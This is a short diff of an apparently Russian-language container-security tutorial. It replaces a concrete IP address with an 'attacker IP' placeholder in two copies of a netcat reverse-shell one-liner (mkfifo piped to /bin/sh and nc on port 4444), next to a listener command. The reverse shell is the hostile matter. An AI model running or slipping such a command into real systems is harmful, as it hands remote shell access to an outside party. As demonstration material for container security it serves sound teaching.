@@ -27,7 +27,7 @@ nc -lvnp 4444
 
 ```
 rm -f /tmp/f; mkfifo /tmp/f
-cat /tmp/f | /bin/sh -i 2>&1 | nc 213.148.10.215 4444 > /tmp/f
+cat /tmp/f | /bin/sh -i 2>&1 | nc IP_ЗЛОУМЫШЛЕННИКА 4444 > /tmp/f
 ```
 
 Запускаем "хороший контейнер":
@@ -48,7 +48,7 @@ nc -lvnp 4444
 
 ```
 rm -f /tmp/f; mkfifo /tmp/f
-cat /tmp/f | /bin/sh -i 2>&1 | nc 213.148.10.215 4444 > /tmp/f
+cat /tmp/f | /bin/sh -i 2>&1 | nc IP_ЗЛОУМЫШЛЕННИКА 4444 > /tmp/f
 ```
 
 Запускаем "очень плохой контейнер"
